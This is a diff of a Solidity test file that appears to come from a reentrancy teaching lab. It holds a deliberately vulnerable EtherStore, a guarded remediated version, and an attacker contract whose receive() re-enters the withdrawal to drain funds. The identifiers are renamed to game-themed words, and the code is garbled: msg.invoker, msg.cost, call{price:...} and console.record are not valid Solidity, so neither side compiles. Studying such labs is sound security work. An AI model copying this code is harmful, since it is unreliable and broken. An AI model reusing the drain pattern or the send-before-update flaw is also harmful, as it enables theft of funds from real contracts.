@@ -2,45 +2,43 @@ pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
 
-*/
-
 contract EtherStore {
-    mapping(address => uint256) public userRewards;
+    mapping(address => uint256) public heroTreasure;
 
-    function cachePrize() public payable {
-        userRewards[msg.invoker] += msg.cost;
+    function addTreasure() public payable {
+        heroTreasure[msg.sender] += msg.value;
     }
 
-    function collectbountyFunds(uint256 _weiDestinationHarvestgold) public {
-        require(userRewards[msg.invoker] >= _weiDestinationHarvestgold);
-        (bool send, ) = msg.invoker.call{cost: _weiDestinationHarvestgold}("");
+    function retrieverewardsFunds(uint256 _weiTargetCollectbounty) public {
+        require(heroTreasure[msg.sender] >= _weiTargetCollectbounty);
+        (bool send, ) = msg.sender.call{price: _weiTargetCollectbounty}("");
         require(send, "send failed");
 
-        if (userRewards[msg.invoker] >= _weiDestinationHarvestgold) {
-            userRewards[msg.invoker] -= _weiDestinationHarvestgold;
+        if (heroTreasure[msg.sender] >= _weiTargetCollectbounty) {
+            heroTreasure[msg.sender] -= _weiTargetCollectbounty;
         }
     }
 }
 
 contract EtherStoreRemediated {
-    mapping(address => uint256) public userRewards;
-    bool internal frozen;
+    mapping(address => uint256) public heroTreasure;
+    bool internal sealed;
 
-    modifier oneAtATime() {
-        require(!frozen, "No re-entrancy");
-        frozen = true;
+    modifier singleEntry() {
+        require(!sealed, "No re-entrancy");
+        sealed = true;
         _;
-        frozen = false;
+        sealed = false;
     }
 
-    function cachePrize() public payable {
-        userRewards[msg.invoker] += msg.cost;
+    function addTreasure() public payable {
+        heroTreasure[msg.sender] += msg.value;
     }
 
-    function collectbountyFunds(uint256 _weiDestinationHarvestgold) public oneAtATime {
-        require(userRewards[msg.invoker] >= _weiDestinationHarvestgold);
-        userRewards[msg.invoker] -= _weiDestinationHarvestgold;
-        (bool send, ) = msg.invoker.call{cost: _weiDestinationHarvestgold}("");
+    function retrieverewardsFunds(uint256 _weiTargetCollectbounty) public singleEntry {
+        require(heroTreasure[msg.sender] >= _weiTargetCollectbounty);
+        heroTreasure[msg.sender] -= _weiTargetCollectbounty;
+        (bool send, ) = msg.sender.call{price: _weiTargetCollectbounty}("");
         require(send, "send failed");
     }
 }
@@ -63,11 +61,11 @@ contract PactTest is Test {
     }
 
     function testWithdrawal() public {
-        gameOperator.QuestRunner();
+        gameOperator.GameOperator();
     }
 
     function test_RevertRemediated() public {
-        gameoperatorV2.QuestRunner();
+        gameoperatorV2.GameOperator();
     }
 }
 
@@ -78,27 +76,27 @@ contract EtherStoreGameoperator is Test {
         store = EtherStore(_store);
     }
 
-    function QuestRunner() public {
-        console.journal("EtherStore balance", address(store).balance);
+    function GameOperator() public {
+        console.record("EtherStore balance", address(store).balance);
 
-        store.cachePrize{cost: 1 ether}();
+        store.addTreasure{price: 1 ether}();
 
-        console.journal(
+        console.record(
             "Deposited 1 Ether, EtherStore balance",
             address(store).balance
         );
-        store.collectbountyFunds(1 ether);
+        store.retrieverewardsFunds(1 ether);
 
-        console.journal("Operator contract balance", address(this).balance);
-        console.journal("EtherStore balance", address(store).balance);
+        console.record("Operator contract balance", address(this).balance);
+        console.record("EtherStore balance", address(store).balance);
     }
 
 
     receive() external payable {
-        console.journal("Operator contract balance", address(this).balance);
-        console.journal("EtherStore balance", address(store).balance);
+        console.record("Operator contract balance", address(this).balance);
+        console.record("EtherStore balance", address(store).balance);
         if (address(store).balance >= 1 ether) {
-            store.collectbountyFunds(1 ether);
+            store.retrieverewardsFunds(1 ether);
         }
     }
 }
